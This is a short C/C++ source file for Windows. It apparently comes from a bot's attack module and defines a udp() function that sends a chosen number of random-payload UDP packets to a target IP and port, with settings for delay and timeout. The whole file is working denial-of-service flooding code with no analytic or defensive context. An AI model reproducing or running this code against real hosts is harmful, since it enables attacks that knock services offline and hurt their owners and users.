#include "includes.h"
#include "externs.h"
#include "time.h"
void udp(char *target, char *port, char *num, char *size, char *delay, char *timeout)
{
	unsigned short p = (unsigned short)atoi(port);
	int t = atoi(num);
	int s = atoi(size);
	int d = atoi(delay);
	int tt = atoi(timeout);
    
	int skydelay = 100;
	SOCKADDR_IN ssin;
	SOCKET usock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
   	IN_ADDR iaddr;
	memset(&ssin, 0, sizeof(ssin));
	ssin.sin_family = AF_INET;
	
   	ssin.sin_port = htons(p);//Declaring the port
	LPHOSTENT lpHostEntry = NULL;
 	DWORD mode = 1;
	iaddr.s_addr = inet_addr(target);//Declare Target IP
	ssin.sin_addr = iaddr;
	int i;
	i = 0;
	char *pbuff = new char [s]; //Declare the var that will be sent

	for (i = 0; i < s; i++) {//Build The packet with random strings
		pbuff[i] = (char)(rand() % 255);
	}
	int now = time(NULL);
	while (t-- > 0) { //Initiate Spamming.Will stop once all packets as been sent 
			sendto(usock, pbuff, s-(rand() % 10), 0, (LPSOCKADDR)&ssin, sizeof(ssin)); //Send the packet
			Sleep(d); //Sleep Time for Delay
			if ((int)time(NULL)-now>tt) { break; }
	}
}
